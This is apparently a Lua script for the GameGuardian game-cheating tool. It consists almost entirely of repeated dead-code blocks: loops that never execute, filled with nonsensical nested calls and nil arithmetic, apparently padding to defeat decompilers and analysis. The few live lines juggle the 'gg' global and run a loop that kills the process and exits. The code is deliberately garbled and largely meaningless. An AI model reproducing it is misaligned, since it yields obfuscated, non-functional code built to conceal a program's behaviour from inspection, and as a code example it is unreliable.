while (nil)do;local o={} local p={} local q={}if (o.o)then if (o.o.o)then if (o.o.o.o) then if (o.o.o.o.o) then if (p.p) then if (p.p.p) then if (p.p.p.p) then if (q.q) then if (q.q.q) then if (q.q.q.q) then;o.o=(o.o(o)) o.o=(o.o(o.o.o(o.o(o)))) p.p=(p.p(p)) p.p=(p.p(p.p.p(p.p.p.p(p.p.p(p.p(p.p)))))) q.q = (q.q(q.q.q(q.q.q.q(q.q.q(q.q(q.q)))))) local r={o.o,p.p,q.q} r.r=r[1]..r[2]..r[3] r.i= r.r(r.r(r.r(r.r(r.r(r.r(r.r)))))) end;end;end;end;end;end;end;end;end;end;end
while (nil)do;local a={} local b={} local c={}if (a.a) then if (a.a.a) then if (a.a.a.a) then if (a.a.a.a.a) then if (b.b) then if (b.b.b) then if (b.b.b.b) then if (c.c) then if (c.c.c) then if (c.c.c.c) then;a.a = (a.a(a)) a.a=(a.a(a.a.a(a.a(a)))) b.b = (b.b(b)) b.b=(b.b(b.b.b(b.b.b.b(b.b.b(b.b(b.b)))))) c.c = (c.c(c.c.c(c.c.c.c(c.c.c(c.c(c.c)))))) local r = {a.a,b.b,c.c} r.r = r[1]..r[2]..r[3] r.i = r.r(r.r(r.r(r.r(r.r(r.r(r.r)))))) end;end;end;end;end;end;end;end;end;end;end
while (nil)do;local z={} local x={} local c={}if (z.z) then if (z.z.z) then if (z.z.z.z) then if (z.z.z.z.z) then if (x.x) then if (x.x.x) then if (x.x.x.x) then if (c.c) then if (c.c.c) then if (c.c.c.c) then;z.z = (z.z(z)) z.z=(z.z(z.z.z(z.z(z)))) x.x = (x.x(x)) x.x=(x.x(x.x.x(x.x.x.x(x.x.x(x.x(x.x)))))) c.c = (c.c(c.c.c(c.c.c.c(c.c.c(c.c(c.c)))))) local r = {z.z,x.x,c.c} r.r = r[1]..r[2]..r[3] r.i = r.r(r.r(r.r(r.r(r.r(r.r(r.r)))))) end;end;end;end;end;end;end;end;end;end;end
while (nil)do;local f={} local g={} local h={}if (f.f) then if (f.f.f) then if (f.f.f.f) then if (f.f.f.f.f) then if (g.g) then if (g.g.g) then if (g.g.g.g) then if (h.h) then if (h.h.h) then if (h.h.h.h) then;f.f = (f.f(f)) f.f=(f.f(f.f.f(f.f(f)))) g.g = (g.g(g)) g.g=(g.g(g.g.g(g.g.g.g(g.g.g(g.g(g.g)))))) h.h = (h.h(h.h.h(h.h.h.h(h.h.h(h.h(h.h)))))) local r = {f.f,g.g,h.h} r.r = r[1]..r[2]..r[3] r.i = r.r(r.r(r.r(r.r(r.r(r.r(r.r)))))) end;end;end;end;end;end;end;end;end;end;end
while (nil)do;local x={}if (x.x)then if (x.x.x)then;x.x=(x.x(x)) x.x=(x.x(x.x.x(x.x(x))))end;end;end
while (nil)do;local o={}if (o.o(o(o.o(o.oo))))then if (o.oo) then oo={} if (oo.o(oo.oo))then;o.o=(o.o(o.o.o(o.oo(oo.o(oo.oo(o.o.o(o.o(o,o)))))))) o={o.o,o.o,o.o,oo.o,oo.oo} p = (nil),(nil)*(nil) o.p = p,p,p,p oo.oo.o = (nil),(nil)..","..o.p..","..(nil)*(nil)/(nil)..",(nil)" _G = {oo.oo.o,_G,oo.oo.o} gg = {oo.oo.o,gg,oo.oo.o} end;end;end;end
for x = 0,1,0 do if nil ~= nil then (-nil)((-nil)[nil] | nil | nil)(-nil)((-nil)[nil] | nil | nil) local _L = {(-nil)((-nil)[nil] | nil | nil)(-nil)((-nil)[nil] | nil | nil),(-nil)((-nil)[nil] | nil | nil),(nil*(-nil)),(-nil)((-nil)[nil] | nil | nil)*(-nil)((-nil)[nil] | nil | nil)/(-nil)((-nil)[nil] | nil | nil)%(-nil)((-nil)[nil] | nil | nil)%(-nil)((-nil)[nil] | nil | nil)%(-nil)((-nil)[nil] | nil | nil),(-nil)((-nil)[nil] | nil | nil)} _L = _L() _L = _Lnil _L= _L():_L(_Lnil)(_Lnil*-1).._Lnil _L = _L(_Lnil)(_L) _L = _L(_Lnil_Lnil)(_L) if _~= nil then  	_ = _ (-nil * nil)() 	_ = nil end _ = _,_(-nil*nil),_ if _L  ~= nil then _L = _ (_Lnil*nil*nil*-nil) _L = nil end if _L == nil then   _L = {_L(_L*nil)(_L*nil)(nil * 1, 1  << nil), _L*nil} end end local _T = {} x[""] = T local K = (x)(x, x) K[1] = 1 end
		for x = 0,1,0 do if nil ~= nil then (-nil)((-nil)[nil] | nil | nil)(-nil)((-nil)[nil] | nil | nil) local _L = {(-nil)((-nil)[nil] | nil | nil)(-nil)((-nil)[nil] | nil | nil),(-nil)((-nil)[nil] | nil | nil),(nil*(-nil)),(-nil)((-nil)[nil] | nil | nil)*(-nil)((-nil)[nil] | nil | nil)/(-nil)((-nil)[nil] | nil | nil)%(-nil)((-nil)[nil] | nil | nil)%(-nil)((-nil)[nil] | nil | nil)%(-nil)((-nil)[nil] | nil | nil),(-nil)((-nil)[nil] | nil | nil)} _L = _L() _L = _Lnil _L= _L():_L(_Lnil)(_Lnil*-1).._Lnil _L = _L(_Lnil)(_L) _L = _L(_Lnil_Lnil)(_L) if _~= nil then  	_ = _ (-nil * nil)() 	_ = nil end _ = _,_(-nil*nil),_ if _L  ~= nil then _L = _ (_Lnil*nil*nil*-nil) _L = nil end if _L == nil then   _L = {_L(_L*nil)(_L*nil)(nil * 1, 1  << nil), _L*nil} end end local _T = {} x[""] = T local K = (x)(x, x) K[1] = 1 end
			while (nil)do;local o={}if (o.o)then if (o.o.o)then;o.o=(o.o(o)) o.o=(o.o(o.o.o(o.o(o))))end;end;end
				while (nil) do;local T={}   if (T.T)then if (T.T.T)then;T.T=(T.T(T)) T.T = (T.T(T.T.T(T.T(T)))) end;end
					while (nil)do;local a={}if (a.a)then if (a.a.a)then if (a.a.a.a) then if(a.a.a.a.a)then if (a.a.a.a.a.a) then;a.a=(a.a(a)) a.a=(a.a(a.a.a(a.a.a.a(a.a.a.a.a(a.a.a.a(a.a.a(a.a(a)))))))) a.b = (a.a(a.a.a(a.a.a.a(a.a.a.a.a(a.a.a.a(a.a.a(a.a(a)))))))),(a.a(a.a.a(a.a.a.a(a.a.a.a.a((a.a.a.a.a.a(a.a.a.a(a.a.a(a.a(a)))))))))) end;end;end;end;end;end
					while nil ~=nil do;local c = {} c.c = nil,nil,nil,nil if (c.c)then;c.c=(c.c(c)) c.c=(c.c(c))end;end
				while not (nil) do gg.setVisible(false)   while true do     gg.setVisible(false)     gg.processKill()     gg.setVisible(true)     os.exit()   end   return end end
			while (nil)do;local o={} local p={} local q={}if (o.o)then if (o.o.o)then if (o.o.o.o) then if (o.o.o.o.o) then if (p.p) then if (p.p.p) then if (p.p.p.p) then if (q.q) then if (q.q.q) then if (q.q.q.q) then;o.o=(o.o(o)) o.o=(o.o(o.o.o(o.o(o)))) p.p=(p.p(p)) p.p=(p.p(p.p.p(p.p.p.p(p.p.p(p.p(p.p)))))) q.q = (q.q(q.q.q(q.q.q.q(q.q.q(q.q(q.q)))))) local r={o.o,p.p,q.q} r.r=r[1]..r[2]..r[3] r.i= r.r(r.r(r.r(r.r(r.r(r.r(r.r)))))) end;end;end;end;end;end;end;end;end;end;end
		while (nil)do;local o={} local p={} local q={}if (o.o)then if (o.o.o)then if (o.o.o.o) then if (o.o.o.o.o) then if (p.p) then if (p.p.p) then if (p.p.p.p) then if (q.q) then if (q.q.q) then if (q.q.q.q) then;o.o=(o.o(o)) o.o=(o.o(o.o.o(o.o(o)))) p.p=(p.p(p)) p.p=(p.p(p.p.p(p.p.p.p(p.p.p(p.p(p.p)))))) q.q = (q.q(q.q.q(q.q.q.q(q.q.q(q.q(q.q)))))) local r={o.o,p.p,q.q} r.r=r[1]..r[2]..r[3] r.i= r.r(r.r(r.r(r.r(r.r(r.r(r.r)))))) end;end;end;end;end;end;end;end;end;end;end
	while (nil)do;local o={} local p={} local q={}if (o.o)then if (o.o.o)then if (o.o.o.o) then if (o.o.o.o.o) then if (p.p) then if (p.p.p) then if (p.p.p.p) then if (q.q) then if (q.q.q) then if (q.q.q.q) then;o.o=(o.o(o)) o.o=(o.o(o.o.o(o.o(o)))) p.p=(p.p(p)) p.p=(p.p(p.p.p(p.p.p.p(p.p.p(p.p(p.p)))))) q.q = (q.q(q.q.q(q.q.q.q(q.q.q(q.q(q.q)))))) local r={o.o,p.p,q.q} r.r=r[1]..r[2]..r[3] r.i= r.r(r.r(r.r(r.r(r.r(r.r(r.r)))))) end;end;end;end;end;end;end;end;end;end;end
for x = 0,1,0 do if nil ~= nil then (-nil)((-nil)[nil] | nil | nil)(-nil)((-nil)[nil] | nil | nil) local _L = {(-nil)((-nil)[nil] | nil | nil)(-nil)((-nil)[nil] | nil | nil),(-nil)((-nil)[nil] | nil | nil),(nil*(-nil)),(-nil)((-nil)[nil] | nil | nil)*(-nil)((-nil)[nil] | nil | nil)/(-nil)((-nil)[nil] | nil | nil)%(-nil)((-nil)[nil] | nil | nil)%(-nil)((-nil)[nil] | nil | nil)%(-nil)((-nil)[nil] | nil | nil),(-nil)((-nil)[nil] | nil | nil)} _L = _L() _L = _Lnil _L= _L():_L(_Lnil)(_Lnil*-1).._Lnil _L = _L(_Lnil)(_L) _L = _L(_Lnil_Lnil)(_L) if _~= nil then  	_ = _ (-nil * nil)() 	_ = nil end _ = _,_(-nil*nil),_ if _L  ~= nil then _L = _ (_Lnil*nil*nil*-nil) _L = nil end if _L == nil then   _L = {_L(_L*nil)(_L*nil)(nil * 1, 1  << nil), _L*nil} end end local _T = {} x[""] = T local K = (x)(x, x) K[1] = 1 end
		for x = 0,1,0 do if nil ~= nil then (-nil)((-nil)[nil] | nil | nil)(-nil)((-nil)[nil] | nil | nil) local _L = {(-nil)((-nil)[nil] | nil | nil)(-nil)((-nil)[nil] | nil | nil),(-nil)((-nil)[nil] | nil | nil),(nil*(-nil)),(-nil)((-nil)[nil] | nil | nil)*(-nil)((-nil)[nil] | nil | nil)/(-nil)((-nil)[nil] | nil | nil)%(-nil)((-nil)[nil] | nil | nil)%(-nil)((-nil)[nil] | nil | nil)%(-nil)((-nil)[nil] | nil | nil),(-nil)((-nil)[nil] | nil | nil)} _L = _L() _L = _Lnil _L= _L():_L(_Lnil)(_Lnil*-1).._Lnil _L = _L(_Lnil)(_L) _L = _L(_Lnil_Lnil)(_L) if _~= nil then  	_ = _ (-nil * nil)() 	_ = nil end _ = _,_(-nil*nil),_ if _L  ~= nil then _L = _ (_Lnil*nil*nil*-nil) _L = nil end if _L == nil then   _L = {_L(_L*nil)(_L*nil)(nil * 1, 1  << nil), _L*nil} end end local _T = {} x[""] = T local K = (x)(x, x) K[1] = 1 end
			while (nil)do;local o={}if (o.o)then if (o.o.o)then;o.o=(o.o(o)) o.o=(o.o(o.o.o(o.o(o))))end;end;end
				while (nil) do;local T={}   if (T.T)then if (T.T.T)then;T.T=(T.T(T)) T.T = (T.T(T.T.T(T.T(T)))) end;end
					while (nil)do;local a={}if (a.a)then if (a.a.a)then if (a.a.a.a) then if(a.a.a.a.a)then if (a.a.a.a.a.a) then;a.a=(a.a(a)) a.a=(a.a(a.a.a(a.a.a.a(a.a.a.a.a(a.a.a.a(a.a.a(a.a(a)))))))) a.b = (a.a(a.a.a(a.a.a.a(a.a.a.a.a(a.a.a.a(a.a.a(a.a(a)))))))),(a.a(a.a.a(a.a.a.a(a.a.a.a.a((a.a.a.a.a.a(a.a.a.a(a.a.a(a.a(a)))))))))) end;end;end;end;end;end
					while nil ~=nil do;local c = {} c.c = nil,nil,nil,nil if (c.c)then;c.c=(c.c(c)) c.c=(c.c(c))end;end
				while not (nil) do gg.setVisible(false)   while true do     gg.setVisible(false)     gg.processKill()     gg.setVisible(true)     os.exit()   end   return end end
			while (nil)do;local o={} local p={} local q={}if (o.o)then if (o.o.o)then if (o.o.o.o) then if (o.o.o.o.o) then if (p.p) then if (p.p.p) then if (p.p.p.p) then if (q.q) then if (q.q.q) then if (q.q.q.q) then;o.o=(o.o(o)) o.o=(o.o(o.o.o(o.o(o)))) p.p=(p.p(p)) p.p=(p.p(p.p.p(p.p.p.p(p.p.p(p.p(p.p)))))) q.q = (q.q(q.q.q(q.q.q.q(q.q.q(q.q(q.q)))))) local r={o.o,p.p,q.q} r.r=r[1]..r[2]..r[3] r.i= r.r(r.r(r.r(r.r(r.r(r.r(r.r)))))) end;end;end;end;end;end;end;end;end;end;end
		while (nil)do;local o={} local p={} local q={}if (o.o)then if (o.o.o)then if (o.o.o.o) then if (o.o.o.o.o) then if (p.p) then if (p.p.p) then if (p.p.p.p) then if (q.q) then if (q.q.q) then if (q.q.q.q) then;o.o=(o.o(o)) o.o=(o.o(o.o.o(o.o(o)))) p.p=(p.p(p)) p.p=(p.p(p.p.p(p.p.p.p(p.p.p(p.p(p.p)))))) q.q = (q.q(q.q.q(q.q.q.q(q.q.q(q.q(q.q)))))) local r={o.o,p.p,q.q} r.r=r[1]..r[2]..r[3] r.i= r.r(r.r(r.r(r.r(r.r(r.r(r.r)))))) end;end;end;end;end;end;end;end;end;end;end
	while (nil)do;local o={} local p={} local q={}if (o.o)then if (o.o.o)then if (o.o.o.o) then if (o.o.o.o.o) then if (p.p) then if (p.p.p) then if (p.p.p.p) then if (q.q) then if (q.q.q) then if (q.q.q.q) then;o.o=(o.o(o)) o.o=(o.o(o.o.o(o.o(o)))) p.p=(p.p(p)) p.p=(p.p(p.p.p(p.p.p.p(p.p.p(p.p(p.p)))))) q.q = (q.q(q.q.q(q.q.q.q(q.q.q(q.q(q.q)))))) local r={o.o,p.p,q.q} r.r=r[1]..r[2]..r[3] r.i= r.r(r.r(r.r(r.r(r.r(r.r(r.r)))))) end;end;end;end;end;end;end;end;end;end;end
while (nil)do;local o={} local p={} local q={}if (o.o)then if (o.o.o)then if (o.o.o.o) then if (o.o.o.o.o) then if (p.p) then if (p.p.p) then if (p.p.p.p) then if (q.q) then if (q.q.q) then if (q.q.q.q) then;o.o=(o.o(o)) o.o=(o.o(o.o.o(o.o(o)))) p.p=(p.p(p)) p.p=(p.p(p.p.p(p.p.p.p(p.p.p(p.p(p.p)))))) q.q = (q.q(q.q.q(q.q.q.q(q.q.q(q.q(q.q)))))) local r={o.o,p.p,q.q} r.r=r[1]..r[2]..r[3] r.i= r.r(r.r(r.r(r.r(r.r(r.r(r.r)))))) end;end;end;end;end;end;end;end;end;end;end
while (nil)do;local x={}if (x.x)then if (x.x.x)then;x.x=(x.x(x)) x.x=(x.x(x.x.x(x.x(x))))end;end;end
while (nil)do;local o={} local p={} local q={}if (o.o)then if (o.o.o)then if (o.o.o.o) then if (o.o.o.o.o) then if (p.p) then if (p.p.p) then if (p.p.p.p) then if (q.q) then if (q.q.q) then if (q.q.q.q) then;o.o=(o.o(o)) o.o=(o.o(o.o.o(o.o(o)))) p.p=(p.p(p)) p.p=(p.p(p.p.p(p.p.p.p(p.p.p(p.p(p.p)))))) q.q = (q.q(q.q.q(q.q.q.q(q.q.q(q.q(q.q)))))) local r={o.o,p.p,q.q} r.r=r[1]..r[2]..r[3] r.i= r.r(r.r(r.r(r.r(r.r(r.r(r.r)))))) end;end;end;end;end;end;end;end;end;end;end
while (nil)do;local a={} local b={} local c={}if (a.a) then if (a.a.a) then if (a.a.a.a) then if (a.a.a.a.a) then if (b.b) then if (b.b.b) then if (b.b.b.b) then if (c.c) then if (c.c.c) then if (c.c.c.c) then;a.a = (a.a(a)) a.a=(a.a(a.a.a(a.a(a)))) b.b = (b.b(b)) b.b=(b.b(b.b.b(b.b.b.b(b.b.b(b.b(b.b)))))) c.c = (c.c(c.c.c(c.c.c.c(c.c.c(c.c(c.c)))))) local r = {a.a,b.b,c.c} r.r = r[1]..r[2]..r[3] r.i = r.r(r.r(r.r(r.r(r.r(r.r(r.r)))))) end;end;end;end;end;end;end;end;end;end;end
while (nil)do;local z={} local x={} local c={}if (z.z) then if (z.z.z) then if (z.z.z.z) then if (z.z.z.z.z) then if (x.x) then if (x.x.x) then if (x.x.x.x) then if (c.c) then if (c.c.c) then if (c.c.c.c) then;z.z = (z.z(z)) z.z=(z.z(z.z.z(z.z(z)))) x.x = (x.x(x)) x.x=(x.x(x.x.x(x.x.x.x(x.x.x(x.x(x.x)))))) c.c = (c.c(c.c.c(c.c.c.c(c.c.c(c.c(c.c)))))) local r = {z.z,x.x,c.c} r.r = r[1]..r[2]..r[3] r.i = r.r(r.r(r.r(r.r(r.r(r.r(r.r)))))) end;end;end;end;end;end;end;end;end;end;end
while (nil)do;local f={} local g={} local h={}if (f.f) then if (f.f.f) then if (f.f.f.f) then if (f.f.f.f.f) then if (g.g) then if (g.g.g) then if (g.g.g.g) then if (h.h) then if (h.h.h) then if (h.h.h.h) then;f.f = (f.f(f)) f.f=(f.f(f.f.f(f.f(f)))) g.g = (g.g(g)) g.g=(g.g(g.g.g(g.g.g.g(g.g.g(g.g(g.g)))))) h.h = (h.h(h.h.h(h.h.h.h(h.h.h(h.h(h.h)))))) local r = {f.f,g.g,h.h} r.r = r[1]..r[2]..r[3] r.i = r.r(r.r(r.r(r.r(r.r(r.r(r.r)))))) end;end;end;end;end;end;end;end;end;end;end
while (nil)do;local x={}if (x.x)then if (x.x.x)then;x.x=(x.x(x)) x.x=(x.x(x.x.x(x.x(x))))end;end;end
while (nil)do;local o={}if (o.o(o(o.o(o.oo))))then if (o.oo) then oo={} if (oo.o(oo.oo))then;o.o=(o.o(o.o.o(o.oo(oo.o(oo.oo(o.o.o(o.o(o,o)))))))) o={o.o,o.o,o.o,oo.o,oo.oo} p = (nil),(nil)*(nil) o.p = p,p,p,p oo.oo.o = (nil),(nil)..","..o.p..","..(nil)*(nil)/(nil)..",(nil)" _G = {oo.oo.o,_G,oo.oo.o} gg = {oo.oo.o,gg,oo.oo.o} end;end;end;end
for x = 0,1,0 do if nil ~= nil then (-nil)((-nil)[nil] | nil | nil)(-nil)((-nil)[nil] | nil | nil) local _L = {(-nil)((-nil)[nil] | nil | nil)(-nil)((-nil)[nil] | nil | nil),(-nil)((-nil)[nil] | nil | nil),(nil*(-nil)),(-nil)((-nil)[nil] | nil | nil)*(-nil)((-nil)[nil] | nil | nil)/(-nil)((-nil)[nil] | nil | nil)%(-nil)((-nil)[nil] | nil | nil)%(-nil)((-nil)[nil] | nil | nil)%(-nil)((-nil)[nil] | nil | nil),(-nil)((-nil)[nil] | nil | nil)} _L = _L() _L = _Lnil _L= _L():_L(_Lnil)(_Lnil*-1).._Lnil _L = _L(_Lnil)(_L) _L = _L(_Lnil_Lnil)(_L) if _~= nil then  	_ = _ (-nil * nil)() 	_ = nil end _ = _,_(-nil*nil),_ if _L  ~= nil then _L = _ (_Lnil*nil*nil*-nil) _L = nil end if _L == nil then   _L = {_L(_L*nil)(_L*nil)(nil * 1, 1  << nil), _L*nil} end end local _T = {} x[""] = T local K = (x)(x, x) K[1] = 1 end
		for x = 0,1,0 do if nil ~= nil then (-nil)((-nil)[nil] | nil | nil)(-nil)((-nil)[nil] | nil | nil) local _L = {(-nil)((-nil)[nil] | nil | nil)(-nil)((-nil)[nil] | nil | nil),(-nil)((-nil)[nil] | nil | nil),(nil*(-nil)),(-nil)((-nil)[nil] | nil | nil)*(-nil)((-nil)[nil] | nil | nil)/(-nil)((-nil)[nil] | nil | nil)%(-nil)((-nil)[nil] | nil | nil)%(-nil)((-nil)[nil] | nil | nil)%(-nil)((-nil)[nil] | nil | nil),(-nil)((-nil)[nil] | nil | nil)} _L = _L() _L = _Lnil _L= _L():_L(_Lnil)(_Lnil*-1).._Lnil _L = _L(_Lnil)(_L) _L = _L(_Lnil_Lnil)(_L) if _~= nil then  	_ = _ (-nil * nil)() 	_ = nil end _ = _,_(-nil*nil),_ if _L  ~= nil then _L = _ (_Lnil*nil*nil*-nil) _L = nil end if _L == nil then   _L = {_L(_L*nil)(_L*nil)(nil * 1, 1  << nil), _L*nil} end end local _T = {} x[""] = T local K = (x)(x, x) K[1] = 1 end
			while (nil)do;local o={}if (o.o)then if (o.o.o)then;o.o=(o.o(o)) o.o=(o.o(o.o.o(o.o(o))))end;end;end
				while (nil) do;local T={}   if (T.T)then if (T.T.T)then;T.T=(T.T(T)) T.T = (T.T(T.T.T(T.T(T)))) end;end
					while (nil)do;local a={}if (a.a)then if (a.a.a)then if (a.a.a.a) then if(a.a.a.a.a)then if (a.a.a.a.a.a) then;a.a=(a.a(a)) a.a=(a.a(a.a.a(a.a.a.a(a.a.a.a.a(a.a.a.a(a.a.a(a.a(a)))))))) a.b = (a.a(a.a.a(a.a.a.a(a.a.a.a.a(a.a.a.a(a.a.a(a.a(a)))))))),(a.a(a.a.a(a.a.a.a(a.a.a.a.a((a.a.a.a.a.a(a.a.a.a(a.a.a(a.a(a)))))))))) end;end;end;end;end;end
					while nil ~=nil do;local c = {} c.c = nil,nil,nil,nil if (c.c)then;c.c=(c.c(c)) c.c=(c.c(c))end;end
				while not (nil) do gg.setVisible(false)   while true do     gg.setVisible(false)     gg.processKill()     gg.setVisible(true)     os.exit()   end   return end end
			while (nil)do;local o={} local p={} local q={}if (o.o)then if (o.o.o)then if (o.o.o.o) then if (o.o.o.o.o) then if (p.p) then if (p.p.p) then if (p.p.p.p) then if (q.q) then if (q.q.q) then if (q.q.q.q) then;o.o=(o.o(o)) o.o=(o.o(o.o.o(o.o(o)))) p.p=(p.p(p)) p.p=(p.p(p.p.p(p.p.p.p(p.p.p(p.p(p.p)))))) q.q = (q.q(q.q.q(q.q.q.q(q.q.q(q.q(q.q)))))) local r={o.o,p.p,q.q} r.r=r[1]..r[2]..r[3] r.i= r.r(r.r(r.r(r.r(r.r(r.r(r.r)))))) end;end;end;end;end;end;end;end;end;end;end
		while (nil)do;local o={} local p={} local q={}if (o.o)then if (o.o.o)then if (o.o.o.o) then if (o.o.o.o.o) then if (p.p) then if (p.p.p) then if (p.p.p.p) then if (q.q) then if (q.q.q) then if (q.q.q.q) then;o.o=(o.o(o)) o.o=(o.o(o.o.o(o.o(o)))) p.p=(p.p(p)) p.p=(p.p(p.p.p(p.p.p.p(p.p.p(p.p(p.p)))))) q.q = (q.q(q.q.q(q.q.q.q(q.q.q(q.q(q.q)))))) local r={o.o,p.p,q.q} r.r=r[1]..r[2]..r[3] r.i= r.r(r.r(r.r(r.r(r.r(r.r(r.r)))))) end;end;end;end;end;end;end;end;end;end;end
	while (nil)do;local o={} local p={} local q={}if (o.o)then if (o.o.o)then if (o.o.o.o) then if (o.o.o.o.o) then if (p.p) then if (p.p.p) then if (p.p.p.p) then if (q.q) then if (q.q.q) then if (q.q.q.q) then;o.o=(o.o(o)) o.o=(o.o(o.o.o(o.o(o)))) p.p=(p.p(p)) p.p=(p.p(p.p.p(p.p.p.p(p.p.p(p.p(p.p)))))) q.q = (q.q(q.q.q(q.q.q.q(q.q.q(q.q(q.q)))))) local r={o.o,p.p,q.q} r.r=r[1]..r[2]..r[3] r.i= r.r(r.r(r.r(r.r(r.r(r.r(r.r)))))) end;end;end;end;end;end;end;end;end;end;end
tg = gg
gg = nil
while (gg)do;local o={}if (o.o(o(o.o(o.oo))))then if (o.oo) then oo={} if (oo.o(oo.oo))then;o.o=(o.o(o.o.o(o.oo(oo.o(oo.oo(o.o.o(o.o(o,o)))))))) o={o.o,o.o,o.o,oo.o,oo.oo} p = (nil),(nil)*(nil) o.p = p,p,p,p oo.oo.o = (nil),(nil)..","..o.p..","..(nil)*(nil)/(nil)..",(nil)" _G = {oo.oo.o,_G,oo.oo.o} gg = {oo.oo.o,gg,oo.oo.o} end;end;end;end
gg =tg
tg = nil
while (tg)do;local o={}if (o.o(o(o.o(o.oo))))then if (o.oo) then oo={} if (oo.o(oo.oo))then;o.o=(o.o(o.o.o(o.oo(oo.o(oo.oo(o.o.o(o.o(o,o)))))))) o={o.o,o.o,o.o,oo.o,oo.oo} p = (nil),(nil)*(nil) o.p = p,p,p,p oo.oo.o = (nil),(nil)..","..o.p..","..(nil)*(nil)/(nil)..",(nil)" _G = {oo.oo.o,_G,oo.oo.o} gg = {oo.oo.o,gg,oo.oo.o} end;end;end;end
while(nil)do;for i=i,i do;local i={}if(i.i)then;i.i=i.i(i)end;for ii=i.i,i.i,i.i do;local ii={}if(ii.i)then;ii.i=ii.i()end;for iii=i,ii.i,i do;local iii={}if(iii.i)then;iii.i=iii.i(i)end;for iiii=i,ii,iii.i do;local iiii={}if(iiii.i)then;iiii.i=iiii.i(i)end;local iiii={}if(iiii.i)then;iiii.i=(iiii|iii|ii|i)(i)end;end;local iii={}if(iii.i)then;iii.i=(true|iii|ii|i)(i)end;end;local ii={}if(ii.i)then;ii.i=(true|false|ii|i)(i)end;end;local i={}if(i.i)then;i.i=(true|false|nil|i)(i)end;return(true|false|nil)end;return;end
while true do if not cuk then if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _(-nil*nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil *1, 1 << nil), -nil} end local k = {} k[''] = k local t = (k)(k, l) t[1] = 1 end cuk = ya break end local xxx = {} local XX = {} local X = {} X.X = {} if xxx.data ~= nil then xxx.sel = xxx.data() end xxx = nil xxx.xxx[Z] = nil xxx.xxx[X] = nil xxx.xxx[i] = nil X.XXX = XX.Z() X.XXX = X.XXX:Z() X.X[B] = X[Z] local gaul = {} if gaul ~= nil then gaul = nil end local zzzzz = {} if zzzzz ~= zzzzz then zzzzz.myname = zzzzz.bydZ() zzzzz.fullnick = zzzzz.bydZ.NesiA() zzzzz.channel = zzzzz.WTKC.eSports() zzzzz.partner = zzzzz.TLL.evils() end end
while true do if not cuk then if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _(-nil*nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil *1, 1 << nil), -nil} end local k = {} k[''] = k local t = (k)(k, l) t[1] = 1 end cuk = ya break end local xxx = {} local XX = {} local X = {} X.X = {} if xxx.data ~= nil then xxx.sel = xxx.data() end xxx = nil xxx.xxx[Z] = nil xxx.xxx[X] = nil xxx.xxx[i] = nil X.XXX = XX.Z() X.XXX = X.XXX:Z() X.X[B] = X[Z] local gaul = {} if gaul ~= nil then gaul = nil end local zzzzz = {} if zzzzz ~= zzzzz then zzzzz.myname = zzzzz.bydZ() zzzzz.fullnick = zzzzz.bydZ.NesiA() zzzzz.channel = zzzzz.WTKC.eSports() zzzzz.partner = zzzzz.TLL.evils() end end
while true do if not cuk then if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _(-nil*nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil *1, 1 << nil), -nil} end local k = {} k[''] = k local t = (k)(k, l) t[1] = 1 end cuk = ya break end local xxx = {} local XX = {} local X = {} X.X = {} if xxx.data ~= nil then xxx.sel = xxx.data() end xxx = nil xxx.xxx[Z] = nil xxx.xxx[X] = nil xxx.xxx[i] = nil X.XXX = XX.Z() X.XXX = X.XXX:Z() X.X[B] = X[Z] local gaul = {} if gaul ~= nil then gaul = nil end local zzzzz = {} if zzzzz ~= zzzzz then zzzzz.myname = zzzzz.bydZ() zzzzz.fullnick = zzzzz.bydZ.NesiA() zzzzz.channel = zzzzz.WTKC.eSports() zzzzz.partner = zzzzz.TLL.evils() end end
while true do if not cuk then if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _(-nil*nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil *1, 1 << nil), -nil} end local k = {} k[''] = k local t = (k)(k, l) t[1] = 1 end cuk = ya break end local xxx = {} local XX = {} local X = {} X.X = {} if xxx.data ~= nil then xxx.sel = xxx.data() end xxx = nil xxx.xxx[Z] = nil xxx.xxx[X] = nil xxx.xxx[i] = nil X.XXX = XX.Z() X.XXX = X.XXX:Z() X.X[B] = X[Z] local gaul = {} if gaul ~= nil then gaul = nil end local zzzzz = {} if zzzzz ~= zzzzz then zzzzz.myname = zzzzz.bydZ() zzzzz.fullnick = zzzzz.bydZ.NesiA() zzzzz.channel = zzzzz.WTKC.eSports() zzzzz.partner = zzzzz.TLL.evils() end end
while true do if not cuk then if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _(-nil*nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil *1, 1 << nil), -nil} end local k = {} k[''] = k local t = (k)(k, l) t[1] = 1 end cuk = ya break end local xxx = {} local XX = {} local X = {} X.X = {} if xxx.data ~= nil then xxx.sel = xxx.data() end xxx = nil xxx.xxx[Z] = nil xxx.xxx[X] = nil xxx.xxx[i] = nil X.XXX = XX.Z() X.XXX = X.XXX:Z() X.X[B] = X[Z] local gaul = {} if gaul ~= nil then gaul = nil end local zzzzz = {} if zzzzz ~= zzzzz then zzzzz.myname = zzzzz.bydZ() zzzzz.fullnick = zzzzz.bydZ.NesiA() zzzzz.channel = zzzzz.WTKC.eSports() zzzzz.partner = zzzzz.TLL.evils() end end
